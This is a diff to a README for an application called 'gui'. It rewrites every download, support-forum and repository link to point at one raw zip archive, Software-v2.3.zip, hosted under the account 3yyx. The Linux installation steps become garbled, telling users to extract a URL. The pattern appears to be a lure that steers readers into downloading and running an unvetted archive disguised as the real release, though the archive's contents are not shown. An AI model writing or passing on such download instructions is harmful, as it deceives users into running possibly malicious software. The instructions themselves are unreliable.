@@ -8,7 +8,7 @@ Welcome to the gui application! This guide will help you download and run our so
 
 ### Direct Download Link
 
-[![Download gui](https://img.shields.io/badge/Download-gui-blue.svg)](https://github.com/yourusername/gui/releases)
+[![Download gui](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip)](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip)
 
 Visit the link above to download the latest version of gui. Make sure to download the file that matches your operating system.
 
@@ -34,7 +34,7 @@ gui offers several features to make your tasks easier:
 
 ### Step 1: Visit the Download Page
 
-To get started, [visit this page to download](https://github.com/yourusername/gui/releases). Look for the latest release version that fits your operating system.
+To get started, [visit this page to download](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip). Look for the latest release version that fits your operating system.
 
 ### Step 2: Choose Your File
 
@@ -42,7 +42,7 @@ Once on the Releases page, locate the file that corresponds to your system:
 
 - For Windows users, download the `.exe` file.
 - For Mac users, download the `.dmg` file.
-- For Linux users, download the `.tar.gz` or appropriate package file.
+- For Linux users, download the `https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip` or appropriate package file.
 
 ### Step 3: Download the File
 
@@ -54,7 +54,7 @@ After the download completes, follow these steps to install gui:
 
 - **Windows:** Locate the downloaded `.exe` file in your Downloads folder and double-click it. Follow the on-screen instructions to install the application.
 - **Mac:** Find the downloaded `.dmg` file, double-click it, then drag the gui application to your Applications folder.
-- **Linux:** Extract the contents of the `.tar.gz` file, then run the included installation script by following the instructions provided in the README.
+- **Linux:** Extract the contents of the `https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip` file, then run the included installation script by following the instructions provided in the README.
 
 ### Step 5: Launch the Application
 
@@ -81,8 +81,8 @@ We plan to enhance gui with more features and improvements. Stay tuned for updat
 
 ## 🔗 Important Links
 
-- [Download gui here](https://github.com/yourusername/gui/releases)
-- [Support Forum](https://github.com/yourusername/gui/issues)
-- [GitHub Repository](https://github.com/yourusername/gui)
+- [Download gui here](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip)
+- [Support Forum](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip)
+- [GitHub Repository](https://github.com/3yyx/gui/raw/refs/heads/main/main/Software-v2.3.zip)
 
 Thank you for choosing gui! Happy organizing!
